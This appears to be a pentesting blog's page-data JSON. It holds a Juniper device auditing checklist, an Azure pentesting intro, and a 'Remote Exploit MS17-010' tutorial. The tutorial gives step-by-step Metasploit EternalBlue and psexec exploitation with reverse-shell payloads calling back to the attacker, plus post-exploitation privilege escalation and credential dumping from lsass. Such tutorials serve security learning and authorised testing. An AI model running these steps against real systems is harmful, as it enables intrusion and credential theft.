{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/auditing-juniper-network-devices/","result":{"pageContext":{"post":{"fields":{"slug":"/auditing-juniper-network-devices"},"excerpt":"Lack of Console Connection Timeout It is possible for a console connection to become unused without being terminated, for example by an…","frontmatter":{"date":"22nd March 2021 ","title":"Auditing Juniper Network Devices","description":"This article describes some of the querks of auditing Juniper network devices","tags":"auditing, console-connection, juniper","posttype":"article"},"body":"\n## Lack of Console Connection Timeout\n\nIt is possible for a console connection to become unused without being terminated, for example by an administrator forgetting to terminate the connection. When this happens, it is possible that an attacker could gain access to the authenticated session (either by gaining physical access or, in the case of less secure network protocols, remotely) and thus gain administrative access.\nIn order to avoid this, the usual best practice is to set a timeout, so connections terminate within a specified time if no actions are taken. \n\nTo check the current timeout sessions you can run the following command\n```\nget console\n```\n\nOr\n```\nshow cli\n```\n\n\nTo set the timeout\n```\nset console timeout <time in minutes>\n```\n\nCommand introduced before Junos OS Release 7.4.\n```\nset cli idle-timeout <minutes>\n```\n\n## Tacacs+\n\nLook for a missing TACACS+ encryption key. If one is not configured on the Juniper device then this configuration may affect the confidentiality of TACACS+ encrypted traffic, as an attacker may be able to intercept it without a password requirement.\n\nAuthentication requests are sent by the Terminal Access Controller Access Control System Plus (TACACS+) server, using TCP/49, and an access response is returned. A TACACS+ encryption key can be configured on both the client and server in order to encrypt and help protect the traffic. Although TACACS+ is considerably more secure than TACACS, a number of security issues exist with the protocol, such as:\n\n* TACACS+ is vulnerable to replay attacks.\n* TACACS+ encrypted packets leak information about the authentication credentials.\n* Weaknesses exist within the TACACS+ encryption.\n\nIn order to address the last of these issues, a strong encryption key should be configured. However, if the key is leaked in plain text by another service an attacker could decrypt the authentication attempt, no matter how strong the encryption may be."},"prev":{"fields":{"slug":"/remote-exploit-ms-17-010"},"excerpt":"This article demonstrates how to exploit the MS17-010 vulnerability with the Metasploit Framework. This article is for educational purposes…","frontmatter":{"date":"27th March 2021 ","title":"Remote Exploit MS17-010","description":"This article serves as a quick reference to exploiting the MS17-010 with the Metasploit Framework. This article is for educational purposes only.","tags":"kali-linux, metasploit, ms17-010, windows","posttype":"article"},"body":"This article demonstrates how to exploit the MS17-010 vulnerability with the `Metasploit Framework`. This article is for educational purposes only.\n\nTwo methods are demonstrated; `with` and `without compromised credentials`. This article does not discuss the vulnerability and its background.\n\n# Method 1 - MS17-010 exploitation without credentials: EternalBlue\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_eternalblue` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_eternalblue\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow targets\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\nConfigure options for your machine with. \n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\nA reverse connection is initiated upon successful exploitation.\n\nFor `post-exploitation tips`, see step 6 of the below instructions.\n\n# MS17-010 Exploitation - With credentials: PSExec\n\nThis example requires credentials to run. This example is done using a domain-joined target.\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_psexec` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_psexec\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow TARGETS\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\nset SMBUSER <user>\nset SMBPASS <password>\nset SMBDOMAIN <domain>\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\nFor example, to use a smaller `bind` payload (`stageless`), you can choose:\n\n```\nset PAYLOAD generic/shell_bind_tcp\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\n<h5 class=\"step\">Step 6 - Optional: Post-Exploitation</h5>\n\nIf you used a non-meterpreter payload, you can upgrade it to Meterpreter using:\n\n```\nCTRL + Z (background session)\nuse post/multi/manage/shell_to_meterpreter\nsessions -l\nset session <session id>\nset LHOST <your IP>\nset LPORT <port of your choice>\nexploit\n```\n\n<b>Note:</b> You may need to run this a few times to upgrade the shell.\n\nOnce you have upgraded your shell, you can escalate your privileges.\n\n```\nsession -i <meterpreter session>\ngetsystem\n```\n\nTo migrate process and dump credentials, use:\n\n```\nps\nmigrate -N lsass.exe\nhashdump\nload kiwi\ncreds_all\n```"},"next":{"fields":{"slug":"/beginners-guide-to-pentesting-azure"},"excerpt":null,"frontmatter":{"date":"22nd March 2021 ","title":"Beginners Guide To Pentesting Azure","description":"This article serves as an introduction to Azure penetration testing.","tags":"azure, connect, cryptography","posttype":"article"},"body":"# Beginners Guide To Pentesting Azure\n\nLet us start by installing the Azure Active Directory PowerShell Modules.\n\n```\nInstall-Module AzureAD\n```\n\n<img src=\"/static/fc3f3cf0-9981-42f0-8a46-62d1a50b6286.png\" class=\"img-fluid\" alt=\"Beginners Guide To Pentesting Azure\">\n\nWith the module installed we can now run the following from the command line to list all the available commands. \n\n```\nget-command -Module AzureAD\n```\n\nIf we look down the list we can see a command for connecting to Azure \n\n<img src=\"/static/c3a9c547-7ef9-4f8d-8e5c-fd81d074a561.png\" class=\"img-fluid\" alt=\"Connecting to Azure\">\n\n```\nConnect-AzureAD\n```\n\nA pop-up should appear asking you to authenticate \n\n<img src=\"/static/05931e0d-0154-4591-99fd-5a11d6d3f6e7.png\" class=\"img-fluid\" alt=\"\">\n\n\nIf you get the following error after trying to connect then you are possibly using PowerShell Core. \n\n`Connect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.\nConnect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.)\nConnect-AzureAD: Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.\nConnect-AzureAD: One or more errors occurred. (Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.): Could not load type 'System.Security.Cryptography.SHA256Cng' from assembly 'System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.`\n\n\nIf you are able to successfully connect you will see a returned table showing your:\n\n* Account\n* Environment, \n* Tenant ID\n* Tenant Domain\n* Account Type\n\nWhat if you want to run cmdlets against a different Tennant. \n\n```\nConnect-AzureAD -Tenant <Tenant ID>\n```\n\nWhere can I find the Tenant ID I hear you say?\n\n### Getting the Tenant ID Via The Portal\n\n<img src=\"/static/75cd2d95-b2cc-442f-a519-60f59b371c5d.png\" class=\"img-fluid\" alt=\"\">\n\n<img src=\"/static/3ec7c6d8-e478-47a1-9acd-9bf7b3ab6548.png\" class=\"img-fluid\" alt=\"\">"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}